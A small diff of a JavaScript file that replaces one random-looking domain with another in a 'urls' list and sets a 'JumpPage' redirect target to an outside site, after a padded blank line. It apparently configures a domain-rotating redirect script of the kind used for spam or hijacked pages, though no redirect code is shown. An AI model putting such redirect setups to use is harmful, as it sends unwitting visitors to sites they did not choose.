@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-        'lgzgyjxgr.cc/',
+        'aflxrqzv.com/',
 ];
                                                                                                                   
 var JumpPage="https://36heiliao.com";
